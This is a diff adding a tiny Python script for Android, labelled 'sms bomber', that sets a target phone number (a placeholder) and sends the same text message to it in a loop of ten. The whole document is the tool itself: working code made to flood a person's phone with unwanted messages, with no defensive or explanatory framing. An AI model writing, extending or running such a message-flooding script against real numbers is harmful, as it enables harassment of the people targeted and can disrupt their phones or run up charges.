@@ -1,0 +1,10 @@
+#sms bomber
+import android
+d=android.Android()
+#1(area code) number(7digits)
+bombed="15550000" #crude example of a phone number
+#how many bombs
+bombnums=range(10)
+msg="bombs are a go!!"
+for i in bombnums:
+    d.smsSend(bombed,msg)
